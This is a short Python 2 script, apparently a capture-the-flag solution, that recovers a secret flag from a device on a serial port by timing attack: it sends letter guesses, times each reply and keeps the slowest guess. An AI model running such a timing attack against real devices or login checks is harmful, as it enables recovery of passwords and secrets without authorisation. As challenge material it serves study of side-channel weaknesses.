#!/usr/bin/python

import serial
import string
import time
import sys

VERBOSE = True 


def get_slowest_letter(d):
   """given dictionary of {string:time}, sort by time and return slowest"""
   items = sorted(d.items(), key=lambda x: x[1])
   slowest_5 = items[-5:]
   return items[-1][0]



def level1(ser):
   """just connect and listen"""
      
   for i in range(6):
      line = ser.readline().strip()
      if line:
	 print line

   ser.write('\n')
   time.sleep(2)
   print ser.readall()



def reset(ser):
   """reset bitstream to known state"""
   ser.write('\n') 
   ser.flush()
   time.sleep(1)
   ser.timeout = 3                                                                       
   print ser.readall()                                                                   



def time_it(ser, guess):
   """send string and time response"""
   replies = []
   ser.timeout = 4 
   ser.write(guess + '\n')
   ser.flush()
   start = time.time()
   reply = ser.read_until('flag: ')
   end = time.time()
   replies.append(reply)
   return end-start



def average_time(ser, guess, count=1, verbose=VERBOSE):
   """send string guess, count times, and average response times
   also check for and discard timeout results"""
   times = []
   i = 0
   timeout_count = 0

   while i < count:
      i += 1
      t = time_it(ser, guess)
      if t > ser.timeout:
	 # timeout
	 if verbose: print "{} (timeout)".format(guess)
	 if timeout_count < 5:
	    i -= 1
	    timeout_count += 1
	    reset(ser)

      else:
	 times.append(t)
	 if verbose: print "{} ({})".format(guess, t)
   
   avg = sum(times)/len(times)
   return avg



if __name__=='__main__':
   alphabet = string.ascii_lowercase
   #alphabet = string.letters
   prefix = ""
  
   start = time.time()
   with serial.Serial('/dev/ttyUSB0', 19200, timeout=1) as s:
      level1(s)
      reset(s)

      # for each position
      while len(prefix) < 20:
	 if VERBOSE: print "---------- {} ----------".format(prefix)
	 d = {} # {letter:time}
 
	 # try each letter and time it
	 for c in alphabet:
	    guess = prefix + c 
	    t = average_time(s, guess, 1)
	    d[guess] = t

	 # prefix is the slowest guess from this iteration
	 slowest = get_slowest_letter(d)
	 prefix = slowest

   print "Completed in {} seconds".format(time.time()-start)
   print "flag is: {}".format(prefix)










